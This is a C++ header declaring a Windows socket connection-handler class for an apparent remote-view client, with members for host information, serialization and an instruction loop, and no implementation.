#pragma once

#include "RemoteView.h"
class ConnectionHandler
{
public:
	ConnectionHandler();
	~ConnectionHandler();
	SOCKET ConnectSocket;
	addrinfoW *ConnectionInfo;
	RemoteView Remote;
	void OnConnect();
	HWND mainHWND;
	
private:

	struct ClientDataStrings
	{
		std::wstring name, IP, OS, Country;
	};
	
	wchar_t* serialize(ClientDataStrings*, int*);
	ClientDataStrings deSerialize(wchar_t* data);
	void InstructionLoop(wchar_t&, int&);
	ClientDataStrings GetComputerInfo();
	void RemoteThread();
};



